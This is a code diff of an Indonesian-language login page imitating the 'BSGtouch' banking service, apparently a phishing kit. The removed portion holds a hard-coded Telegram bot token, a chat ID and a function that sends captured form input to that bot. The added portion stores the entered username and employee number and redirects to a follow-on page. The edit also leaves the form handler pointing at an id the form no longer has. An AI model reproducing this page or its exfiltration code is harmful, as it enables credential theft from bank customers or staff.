@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
+<!DOCTYPE html><html lang="id"><head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>BSGtouch - Pendaftaran</title>
@@ -371,7 +369,7 @@ onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;l
       <div class="card">
         <h1>Selamat Datang</h1>
 
-          <form id="loginForm" action="req/1.php" method="POST" autocomplete="on">
+          <form action="script.js" method="POST" autocomplete="on">
           <div class="field">
             <div class="label">Masukkan Username</div>
             <div class="inputWrap">
@@ -490,20 +488,29 @@ onerror="this.outerHTML='<div class=&quot;logo-fallback&quot;><div class=&quot;l
       toast("Silakan hubungi Contact Center 1500 659");
     });
 
-    // Telegram Bot Configuration
-    const TELEGRAM_BOT_TOKEN = '8260302249:AAG8Gjw6PkPt9zSWQQ9mIme8hRtjQvr7BQk'; // Ganti dengan token bot Telegram Anda
-    const TELEGRAM_CHAT_ID = '5529657606'; // Ganti dengan chat ID Anda (bisa didapat dari @userinfobot)
+    // Submit -> redirect to tujuan.html
+    $("#loginForm").addEventListener("submit", (e) => {
+      e.preventDefault();
 
-    // Function to send message to Telegram
-    async function sendToTelegram(message) {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-      const data = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML' // Menggunakan HTML untuk format teks
-      };
+      const username = usernameEl.value.trim();
+      const nik = nikEl.value; // bebas, tidak difilter
 
-      try {
-        const response = await fetch(url, {
-          method: 'POST',
-          headers: {
+      if (!username) return toast("Username wajib diisi.");
+      if (!nik) return toast("Nomor Induk Karyawan wajib diisi.");
+
+      if (rememberToggle.checked) {
+        localStorage.setItem("bsgtouch_username", username);
+        localStorage.setItem("bsgtouch_remember", "1");
+      }
+
+      sessionStorage.setItem("bsgtouch_login_username", username);
+      sessionStorage.setItem("bsgtouch_login_nik", nik);
+
+      window.location.href = "tujuan.html";
+    });
+  </script>
+
+
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"e85f34afbd49464aa58cbbf4c786ccfa","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"2ddab775095544c4afd29f135ffadce1","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body></html>
